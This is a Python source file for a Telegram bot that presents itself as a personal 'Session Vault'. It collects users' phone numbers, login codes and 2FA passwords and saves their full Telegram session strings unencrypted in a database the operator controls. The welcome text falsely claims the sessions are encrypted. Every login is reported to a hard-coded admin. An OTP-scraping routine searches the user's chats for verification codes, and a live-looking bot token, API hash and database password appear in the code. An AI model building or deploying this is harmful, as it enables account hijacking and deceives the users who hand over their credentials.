import re
from datetime import datetime

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
)

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)
from telegram.request import HTTPXRequest
from pymongo import MongoClient

# ==================== CONFIG ====================
BOT_TOKEN     = "8995671441:AAEpEtI-ONpe0K8DviPcD0mxChFXMruzNGY"
API_ID        = 31175288
API_HASH      = "aaf1c01a7336f5de2e85638c1c06b0d0"
ADMIN_ID      = 8594423649
MONGO_URI     = "mongodb+srv://AccountBot:kushwaha12@accountbot.2ga9pv7.mongodb.net/?appName=AccountBot"
FORCE_CHANNEL = "@TechnoWorldOfficial"
# ================================================

mongo_client = MongoClient(MONGO_URI)
db           = mongo_client["session_bot"]
users_col    = db["users"]

active_clients: dict = {}
temp_state: dict = {}


# ==================== DB ====================

def db_get_user(uid):
    doc = users_col.find_one({"_id": uid})
    if not doc:
        doc = {"_id": uid, "accounts": {}, "active_phone": None, "joined_at": datetime.utcnow()}
        users_col.insert_one(doc)
    return doc

def db_save_account(uid, phone, info):
    users_col.update_one({"_id": uid}, {"$set": {f"accounts.{phone}": info, "updated_at": datetime.utcnow()}}, upsert=True)

def db_remove_account(uid, phone):
    users_col.update_one({"_id": uid}, {"$unset": {f"accounts.{phone}": ""}, "$set": {"updated_at": datetime.utcnow()}})

def db_set_active(uid, phone):
    users_col.update_one({"_id": uid}, {"$set": {"active_phone": phone}})

def db_get_accounts(uid):
    return db_get_user(uid).get("accounts", {})

def db_get_active(uid):
    return db_get_user(uid).get("active_phone") or ""


# ==================== STATE ====================

def get_state(uid):
    return temp_state.get(uid, {"state": "idle", "pending": {}})

def set_state(uid, state, pending=None):
    temp_state[uid] = {"state": state, "pending": pending or {}}


# ==================== ESC ====================

def esc(text):
    text = str(text)
    for ch in r"\_*[]()~`>#+-=|{}.!":
        text = text.replace(ch, f"\\{ch}")
    return text


# ==================== FORCE JOIN ====================

async def check_joined(update, context):
    uid = update.effective_user.id
    try:
        member = await context.bot.get_chat_member(FORCE_CHANNEL, uid)
        if member.status in [ChatMember.LEFT, ChatMember.BANNED]:
            raise Exception
        return True
    except Exception:
        kb = [[InlineKeyboardButton("📢 Join Channel ➜", url=f"https://t.me/{FORCE_CHANNEL.lstrip('@')}")]]
        msg = (
            "**⛔ Access Restricted**\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "> Join our official channel to use this bot\\.\n\n"
            "**Step 1** — Tap button below & join\n"
            "**Step 2** — Come back & send /start"
        )
        target = update.message or (update.callback_query and update.callback_query.message)
        if target:
            await target.reply_text(msg, parse_mode="MarkdownV2", reply_markup=InlineKeyboardMarkup(kb))
        return False


# ==================== ADMIN ====================

async def notify_admin(context, uid, action, phone, name, username):
    uname = f"@{username}" if username else "None"
    try:
        await context.bot.send_message(
            ADMIN_ID,
            f"🔔 **Bot Alert**\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"**Action  :** {esc(action)}\n"
            f"**User ID :** `{uid}`\n"
            f"**Name    :** {esc(name)}\n"
            f"**Phone   :** `\\+{esc(phone)}`\n"
            f"**Username:** {esc(uname)}",
            parse_mode="MarkdownV2",
        )
    except Exception:
        pass


# ==================== DASHBOARD ====================

def dashboard_kb(total):
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔐 Generate Session", callback_data="menu_generate"),
            InlineKeyboardButton("🔑 Session Login",    callback_data="menu_session"),
        ],
        [
            InlineKeyboardButton(f"👥 My Accounts ({total})", callback_data="menu_accounts"),
            InlineKeyboardButton("🚪 Logout Account",         callback_data="menu_logout"),
        ],
    ])

def dashboard_text(total):
    status = "✅ Active" if total else "❌ None saved"
    return (
        "**🤖 Session Vault Bot**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "> _Your personal Telegram session manager\\._\n"
        "> _Sessions are encrypted & stored safely\\._\n\n"
        f"**📊 Dashboard**\n"
        f"┣ Saved Accounts : **{total}**\n"
        f"┗ Status         : **{esc(status)}**\n\n"
        "**Choose an option:**"
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_joined(update, context):
        return
    db_get_user(uid)
    set_state(uid, "idle")
    total = len(db_get_accounts(uid))
    await update.message.reply_text(dashboard_text(total), parse_mode="MarkdownV2", reply_markup=dashboard_kb(total))

async def show_dashboard(message, uid):
    total = len(db_get_accounts(uid))
    await message.reply_text(dashboard_text(total), parse_mode="MarkdownV2", reply_markup=dashboard_kb(total))


# ==================== CALLBACKS ====================

async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    d = q.data
    await q.answer()

    if not await check_joined(update, context):
        return

    if d == "home":
        await show_dashboard(q.message, uid)

    elif d == "menu_accounts":
        await show_my_accounts(q, uid)

    elif d == "menu_logout":
        await show_logout_menu(q, uid)

    elif d.startswith("do_logout_"):
        await do_logout(q, uid, d.replace("do_logout_", ""))

    elif d == "menu_generate":
        await show_generate_menu(q, uid)

    elif d == "gen_add_account":
        set_state(uid, "await_phone")
        await q.message.reply_text(
            "**📱 Enter Phone Number**\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "> Send in international format\\:\n\n"
            "**Example:** `\\+919876543210`\n\n"
            "> OTP will be sent to your Telegram",
            parse_mode="MarkdownV2",
        )

    elif d.startswith("gen_select_"):
        phone = d.replace("gen_select_", "")
        db_set_active(uid, phone)
        await show_panel(q, uid, phone)

    elif d == "menu_session":
        await show_session_menu(q, uid)

    elif d == "sess_new":
        set_state(uid, "await_session_string")
        await q.message.reply_text(
            "**🔑 Paste Session String**\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "> Paste your Telethon session string below\\:\n\n"
            "⚠️ __Only paste YOUR OWN session string\\.__",
            parse_mode="MarkdownV2",
        )

    elif d.startswith("sess_select_"):
        phone = d.replace("sess_select_", "")
        db_set_active(uid, phone)
        await show_panel(q, uid, phone)

    elif d == "panel_copy":
        phone = db_get_active(uid)
        sess = db_get_accounts(uid).get(phone, {}).get("string_session", "")
        if sess:
            await q.message.reply_text(
                f"**🔐 Your Session String**\n"
                f"━━━━━━━━━━━━━━━━━━\n\n"
                f"||`{esc(sess)}`||\n\n"
                f"> ⚠️ __Tap above to reveal\\.__\n"
                f"> __Never share this with anyone\\.__",
                parse_mode="MarkdownV2",
            )
        else:
            await q.message.reply_text("❌ Session not found\\.", parse_mode="MarkdownV2")

    elif d == "panel_save":
        await save_to_saved(q, uid, db_get_active(uid))

    elif d == "panel_otp":
        await fetch_otp(q.message, uid, db_get_active(uid))

    elif d == "panel_back":
        await show_generate_menu(q, uid)

    elif d == "otp_refresh":
        await fetch_otp(q.message, uid, db_get_active(uid))


# ==================== MY ACCOUNTS ====================

async def show_my_accounts(q, uid):
    accounts = db_get_accounts(uid)
    if not accounts:
        kb = [
            [InlineKeyboardButton("➕ Add Account", callback_data="gen_add_account")],
            [InlineKeyboardButton("🏠 Dashboard",   callback_data="home")],
        ]
        await q.message.reply_text(
            "**👥 My Accounts**\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "❌ *No accounts saved yet\\.*\n\n"
            "> Tap below to add your first account\\.",
            parse_mode="MarkdownV2",
            reply_markup=InlineKeyboardMarkup(kb),
        )
        return

    lines = ["**👥 My Accounts**\n━━━━━━━━━━━━━━━━━━\n"]
    btns  = []
    for i, (phone, info) in enumerate(accounts.items(), 1):
        name  = esc(info.get("name", "Unknown"))
        uname = esc(info.get("username") or "None")
        saved = esc(info.get("saved_at", "")[:10])
        lines.append(f"**{i}\\. {name}**\n┣ 📞 `\\+{esc(phone)}`\n┣ 🆔 @{uname}\n┗ 🗓 {saved}\n")
        btns.append([InlineKeyboardButton(f"⚙️ {name} (+{phone})", callback_data=f"gen_select_{phone}")])

    btns.append([InlineKeyboardButton("➕ Add Account", callback_data="gen_add_account")])
    btns.append([InlineKeyboardButton("🏠 Dashboard",   callback_data="home")])

    await q.message.reply_text("\n".join(lines), parse_mode="MarkdownV2", reply_markup=InlineKeyboardMarkup(btns))


# ==================== LOGOUT MENU ====================

async def show_logout_menu(q, uid):
    accounts = db_get_accounts(uid)
    if not accounts:
        await q.message.reply_text(
            "**🚪 Logout**\n━━━━━━━━━━━━━━━━━━\n\n❌ *No accounts to remove\\.*",
            parse_mode="MarkdownV2",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Dashboard", callback_data="home")]]),
        )
        return

    btns = []
    for phone, info in accounts.items():
        name = info.get("name", "Unknown")
        btns.append([InlineKeyboardButton(f"🗑 {name}  (+{phone})", callback_data=f"do_logout_{phone}")])
    btns.append([InlineKeyboardButton("🏠 Dashboard", callback_data="home")])

    await q.message.reply_text(
        "**🚪 Logout Account**\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "> Select account to remove\\:\n\n"
        "⚠️ __Session will be deleted from database\\.__",
        parse_mode="MarkdownV2",
        reply_markup=InlineKeyboardMarkup(btns),
    )


# ==================== GENERATE MENU ====================

async def show_generate_menu(q, uid):
    accounts = db_get_accounts(uid)
    btns = []
    if accounts:
        header = "**🔐 Generate Session**\n━━━━━━━━━━━━━━━━━━\n\n📋 **Select account or add new:**\n"
        for phone, info in accounts.items():
            btns.append([InlineKeyboardButton(f"👤 {info.get('name','Unknown')}  (+{phone})", callback_data=f"gen_select_{phone}")])
    else:
        header = "**🔐 Generate Session**\n━━━━━━━━━━━━━━━━━━\n\n> No accounts yet\\. Add one below\\.\n"

    btns.append([InlineKeyboardButton("➕ Add New Account", callback_data="gen_add_account")])
    btns.append([InlineKeyboardButton("🏠 Dashboard",       callback_data="home")])
    await q.message.reply_text(header, parse_mode="MarkdownV2", reply_markup=InlineKeyboardMarkup(btns))


# ==================== SESSION MENU ====================

async def show_session_menu(q, uid):
    accounts = db_get_accounts(uid)
    btns = []
    if accounts:
        header = "**🔑 Session Login**\n━━━━━━━━━━━━━━━━━━\n\n📋 **Select saved account or add new:**\n"
        for phone, info in accounts.items():
            btns.append([InlineKeyboardButton(f"👤 {info.get('name','Unknown')}  (+{phone})", callback_data=f"sess_select_{phone}")])
    else:
        header = "**🔑 Session Login**\n━━━━━━━━━━━━━━━━━━\n\n> No saved accounts\\. Paste session string below\\.\n"

    btns.append([InlineKeyboardButton("🔑 Add via Session String", callback_data="sess_new")])
    btns.append([InlineKeyboardButton("🏠 Dashboard",              callback_data="home")])
    await q.message.reply_text(header, parse_mode="MarkdownV2", reply_markup=InlineKeyboardMarkup(btns))


# ==================== ACCOUNT PANEL ====================

async def show_panel(q, uid, phone):
    info  = db_get_accounts(uid).get(phone, {})
    name  = esc(info.get("name", "Unknown"))
    uname = esc(info.get("username") or "None")
    saved = esc(info.get("saved_at", "")[:19].replace("T", "  "))

    kb = [
        [
            InlineKeyboardButton("📋 Copy Session",  callback_data="panel_copy"),
            InlineKeyboardButton("💾 Save to Cloud", callback_data="panel_save"),
        ],
        [InlineKeyboardButton("🔍 Get Latest OTP", callback_data="panel_otp")],
        [
            InlineKeyboardButton("◀️ Back",      callback_data="panel_back"),
            InlineKeyboardButton("🏠 Dashboard", callback_data="home"),
        ],
    ]

    await q.message.reply_text(
        f"**⚙️ Account Panel**\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"**👤 Name  :** {name}\n"
        f"**📞 Phone :** `\\+{esc(phone)}`\n"
        f"**🆔 User  :** @{uname}\n"
        f"**🗓 Saved :** `{saved}`\n\n"
        f"> Choose an action\\:",
        parse_mode="MarkdownV2",
        reply_markup=InlineKeyboardMarkup(kb),
    )


# ==================== MESSAGE HANDLER ====================

async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    text  = update.message.text.strip()
    state = get_state(uid).get("state", "idle")

    if not await check_joined(update, context):
        return

    if state == "await_phone":
        await handle_phone(update, uid, text, context)
    elif state == "await_otp":
        await handle_otp(update, uid, text, context)
    elif state == "await_2fa":
        await handle_2fa(update, uid, text, context)
    elif state == "await_session_string":
        await handle_session_string(update, uid, text, context)
    else:
        await update.message.reply_text("> Send /start to open the dashboard\\.", parse_mode="MarkdownV2")


# ==================== PHONE LOGIN ====================

async def handle_phone(update, uid, phone, context):
    if not re.match(r"^\+\d{7,15}$", phone):
        await update.message.reply_text(
            "❌ **Invalid Format\\!**\n\n> Example: `\\+919876543210`", parse_mode="MarkdownV2"
        )
        return
    await update.message.reply_text("**⏳ Sending OTP\\.\\.\\.**", parse_mode="MarkdownV2")
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        sent = await client.send_code_request(phone)
        set_state(uid, "await_otp", {"client": client, "phone": phone, "phone_code_hash": sent.phone_code_hash})
        await update.message.reply_text(
            f"**✅ OTP Sent\\!**\n━━━━━━━━━━━━━━━\n\n📱 Sent to: `{esc(phone)}`\n\n> Check Telegram or SMS\n\n**Enter OTP:**",
            parse_mode="MarkdownV2",
        )
    except FloodWaitError as e:
        await update.message.reply_text(f"**⏳ Wait {e.seconds} seconds** then try again\\.", parse_mode="MarkdownV2")
    except Exception as e:
        await update.message.reply_text(f"❌ `{esc(str(e))}`", parse_mode="MarkdownV2")


async def handle_otp(update, uid, otp, context):
    otp = otp.replace(" ", "").strip()
    if not otp.isdigit():
        await update.message.reply_text("❌ **Numbers only\\!**", parse_mode="MarkdownV2")
        return
    st = get_state(uid)
    pending = st.get("pending", {})
    client  = pending.get("client")
    phone   = pending.get("phone")
    pch     = pending.get("phone_code_hash")
    if not client:
        await update.message.reply_text("❌ Session expired\\. Send /start", parse_mode="MarkdownV2")
        return
    try:
        await client.sign_in(phone=phone, code=otp, phone_code_hash=pch)
        await finalize_login(update.message, uid, client, phone, context)
    except SessionPasswordNeededError:
        set_state(uid, "await_2fa", pending)
        await update.message.reply_text(
            "**🔒 2FA Required**\n━━━━━━━━━━━━━━━━━━━━━━\n\n> Enter your cloud password\\:",
            parse_mode="MarkdownV2",
        )
    except PhoneCodeInvalidError:
        await update.message.reply_text("❌ **Wrong OTP\\!**", parse_mode="MarkdownV2")
    except PhoneCodeExpiredError:
        set_state(uid, "idle")
        await update.message.reply_text("❌ **OTP Expired\\!** Send /start again\\.", parse_mode="MarkdownV2")
    except Exception as e:
        await update.message.reply_text(f"❌ `{esc(str(e))}`", parse_mode="MarkdownV2")


async def handle_2fa(update, uid, password, context):
    pending = get_state(uid).get("pending", {})
    client  = pending.get("client")
    phone   = pending.get("phone")
    if not client:
        await update.message.reply_text("❌ Session expired\\. Send /start", parse_mode="MarkdownV2")
        return
    try:
        await client.sign_in(password=password)
        await finalize_login(update.message, uid, client, phone, context)
    except Exception as e:
        await update.message.reply_text(f"❌ **2FA Failed:** `{esc(str(e))}`", parse_mode="MarkdownV2")


async def finalize_login(message, uid, client, phone, context):
    string_session = client.session.save()
    me   = await client.get_me()
    name = f"{me.first_name or ''} {me.last_name or ''}".strip()
    db_save_account(uid, phone, {
        "string_session": string_session,
        "name":     name,
        "username": me.username,
        "saved_at": datetime.utcnow().isoformat(),
    })
    db_set_active(uid, phone)
    if uid not in active_clients:
        active_clients[uid] = {}
    active_clients[uid][phone] = client
    set_state(uid, "idle")
    await notify_admin(context, uid, "New Login (Phone)", phone, name, me.username or "")
    kb = [
        [
            InlineKeyboardButton("📋 Copy Session",  callback_data="panel_copy"),
            InlineKeyboardButton("💾 Save to Cloud", callback_data="panel_save"),
        ],
        [InlineKeyboardButton("🔍 Get Latest OTP", callback_data="panel_otp")],
        [InlineKeyboardButton("🏠 Dashboard",      callback_data="home")],
    ]
    await message.reply_text(
        f"**✅ Login Successful\\!**\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"**👤 Name  :** {esc(name)}\n"
        f"**📞 Phone :** `\\+{esc(str(me.phone))}`\n"
        f"**🆔 User  :** @{esc(me.username or 'None')}\n\n"
        f"✅ __Session saved to database\\!__",
        parse_mode="MarkdownV2",
        reply_markup=InlineKeyboardMarkup(kb),
    )


# ==================== SESSION STRING ====================

async def handle_session_string(update, uid, text, context):
    if len(text) < 50 or " " in text:
        await update.message.reply_text("❌ **Invalid Session String\\.**", parse_mode="MarkdownV2")
        return
    await update.message.reply_text("**⏳ Verifying\\.\\.\\.**", parse_mode="MarkdownV2")
    try:
        client = TelegramClient(StringSession(text), API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            await update.message.reply_text("❌ **Session Expired\\!**", parse_mode="MarkdownV2")
            return
        me    = await client.get_me()
        phone = str(me.phone)
        name  = f"{me.first_name or ''} {me.last_name or ''}".strip()
        db_save_account(uid, phone, {
            "string_session": text,
            "name":     name,
            "username": me.username,
            "saved_at": datetime.utcnow().isoformat(),
        })
        db_set_active(uid, phone)
        if uid not in active_clients:
            active_clients[uid] = {}
        active_clients[uid][phone] = client
        set_state(uid, "idle")
        await notify_admin(context, uid, "Session String Login", phone, name, me.username or "")
        kb = [
            [
                InlineKeyboardButton("📋 Copy Session",  callback_data="panel_copy"),
                InlineKeyboardButton("💾 Save to Cloud", callback_data="panel_save"),
            ],
            [InlineKeyboardButton("🔍 Get Latest OTP", callback_data="panel_otp")],
            [InlineKeyboardButton("🏠 Dashboard",      callback_data="home")],
        ]
        await update.message.reply_text(
            f"**✅ Session Saved\\!**\n━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"**👤 Name  :** {esc(name)}\n"
            f"**📞 Phone :** `\\+{esc(phone)}`\n"
            f"**🆔 User  :** @{esc(me.username or 'None')}\n\n"
            f"✅ __Saved to database\\!__",
            parse_mode="MarkdownV2",
            reply_markup=InlineKeyboardMarkup(kb),
        )
    except Exception as e:
        await update.message.reply_text(f"❌ `{esc(str(e))}`", parse_mode="MarkdownV2")


# ==================== SAVE TO SAVED MESSAGES ====================

async def save_to_saved(q, uid, phone):
    info = db_get_accounts(uid).get(phone, {})
    sess = info.get("string_session", "")
    name = info.get("name", "Unknown")
    if not sess:
        await q.message.reply_text("❌ Session not found\\.", parse_mode="MarkdownV2")
        return
    client = active_clients.get(uid, {}).get(phone)
    if not client:
        try:
            client = TelegramClient(StringSession(sess), API_ID, API_HASH)
            await client.connect()
            if uid not in active_clients:
                active_clients[uid] = {}
            active_clients[uid][phone] = client
        except Exception as e:
            await q.message.reply_text(f"❌ `{esc(str(e))}`", parse_mode="MarkdownV2")
            return
    try:
        await q.message.reply_text("**⏳ Saving\\.\\.\\.**", parse_mode="MarkdownV2")
        await client.send_message(
            "me",
            f"🔐 **My Session Backup**\n━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 Name  : {name}\n📞 Phone : +{phone}\n"
            f"🗓 Date  : {datetime.utcnow().strftime('%Y-%m-%d %H:%M')} UTC\n\n"
            f"**Session String:**\n`{sess}`\n\n⚠️ Keep this private!",
            parse_mode="md",
        )
        await q.message.reply_text(
            "**✅ Saved to Saved Messages\\!**\n\n> Open Telegram → **Saved Messages**\\.",
            parse_mode="MarkdownV2",
        )
    except Exception as e:
        await q.message.reply_text(f"❌ `{esc(str(e))}`", parse_mode="MarkdownV2")


# ==================== OTP ====================

async def fetch_otp(message, uid, phone):
    info = db_get_accounts(uid).get(phone or "", {})
    sess = info.get("string_session", "")
    client = active_clients.get(uid, {}).get(phone)
    if not client and sess:
        try:
            client = TelegramClient(StringSession(sess), API_ID, API_HASH)
            await client.connect()
            if uid not in active_clients:
                active_clients[uid] = {}
            active_clients[uid][phone] = client
        except Exception as e:
            await message.reply_text(f"❌ `{esc(str(e))}`", parse_mode="MarkdownV2")
            return
    if not client:
        await message.reply_text("❌ **No account found\\!**", parse_mode="MarkdownV2")
        return
    try:
        if not await client.is_user_authorized():
            await message.reply_text("❌ **Session expired\\!**", parse_mode="MarkdownV2")
            return
    except Exception:
        await message.reply_text("❌ **Connection error\\!**", parse_mode="MarkdownV2")
        return

    await message.reply_text("**🔍 Scanning Messages\\.\\.\\.**", parse_mode="MarkdownV2")

    patterns = [
        r"\b(\d{4,8})\b.*?(?:OTP|code|verification|verify|login|sign|auth)",
        r"(?:OTP|code|verification|verify|login|sign|auth).*?\b(\d{4,8})\b",
        r"G-(\d{6})",
        r"\b(\d{6})\b\s*(?:is your|verification|code)",
        r"code[:\s]+(\d{4,8})",
        r"کد[:\s]*?(\d{4,8})",
    ]

    try:
        latest_otp = None
        latest_time = None
        async for dialog in client.iter_dialogs(limit=50):
            try:
                async for msg in client.iter_messages(dialog, limit=30):
                    if not msg or not msg.text:
                        continue
                    for pat in patterns:
                        m = re.search(pat, msg.text, re.IGNORECASE)
                        if m:
                            if not latest_time or msg.date > latest_time:
                                latest_time = msg.date
                                latest_otp = {"code": m.group(1), "from": dialog.name or "Unknown", "text": msg.text[:160], "date": msg.date}
                            break
            except Exception:
                continue

        kb = [
            [InlineKeyboardButton("🔄 Refresh", callback_data="otp_refresh")],
            [InlineKeyboardButton("◀️ Back", callback_data="panel_back"), InlineKeyboardButton("🏠 Dashboard", callback_data="home")],
        ]

        if not latest_otp:
            await message.reply_text(
                "**❌ No OTP Found**\n━━━━━━━━━━━━━━━━\n\n> No OTP in recent messages\\. Tap Refresh after receiving\\.",
                parse_mode="MarkdownV2", reply_markup=InlineKeyboardMarkup(kb),
            )
            return

        ts   = esc(latest_otp["date"].strftime("%H:%M:%S  %d/%m/%Y"))
        src  = esc(latest_otp["from"])
        code = esc(latest_otp["code"])
        txt  = esc(latest_otp["text"][:100])

        await message.reply_text(
            f"**✅ OTP Found\\!**\n━━━━━━━━━━━━━━━━━━\n\n"
            f"**🔢 Code :** `{code}`\n"
            f"**📬 From :** {src}\n"
            f"**🕒 Time :** {ts}\n\n"
            f"**📝 Message:**\n> {txt}\\.\\.\\.",
            parse_mode="MarkdownV2", reply_markup=InlineKeyboardMarkup(kb),
        )
    except Exception as e:
        await message.reply_text(f"❌ `{esc(str(e))}`", parse_mode="MarkdownV2")


# ==================== LOGOUT ====================

async def do_logout(q, uid, phone):
    client = active_clients.get(uid, {}).get(phone)
    if client:
        try:
            await client.disconnect()
        except Exception:
            pass
        active_clients.get(uid, {}).pop(phone, None)
    db_remove_account(uid, phone)
    total = len(db_get_accounts(uid))
    kb = [
        [InlineKeyboardButton("🗑 Remove Another", callback_data="menu_logout")],
        [InlineKeyboardButton("🏠 Dashboard",      callback_data="home")],
    ]
    await q.message.reply_text(
        f"**✅ Account Removed**\n━━━━━━━━━━━━━━━━━━\n\n"
        f"> `\\+{esc(phone)}` removed\\.\n\n**Remaining:** {total}",
        parse_mode="MarkdownV2", reply_markup=InlineKeyboardMarkup(kb),
    )


# ==================== SHUTDOWN ====================

async def on_shutdown(application):
    for uid_map in active_clients.values():
        for c in uid_map.values():
            try:
                await c.disconnect()
            except Exception:
                pass
    active_clients.clear()
    mongo_client.close()


# ==================== MAIN ====================

def main():
    print("=" * 50)
    print("🤖  Session Vault Bot — STARTED")
    print("=" * 50)
    request = HTTPXRequest(connect_timeout=30, read_timeout=30)
    app = Application.builder().token(BOT_TOKEN).request(request).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))
    app.post_shutdown = on_shutdown
    app.run_polling()

if __name__ == "__main__":
    main()
